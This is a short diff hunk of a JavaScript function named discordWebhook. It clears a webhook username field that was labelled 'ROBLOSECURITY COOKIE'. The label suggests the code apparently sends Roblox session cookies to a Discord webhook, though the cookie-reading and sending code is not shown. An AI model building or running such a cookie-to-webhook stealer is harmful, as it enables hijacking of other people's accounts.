@@ -15,7 +15,7 @@ function discordWebhook(){
 
       	//lets have an parameter to send to the discord webhook .
       const params = {
-        username: "ROBLOSECURITY COOKIE", 
+        username: "", 
         //username (if not set it is default what you set in discord)
         avatar_url: "",
          //avatar url (if not set it is default what you set in discord)
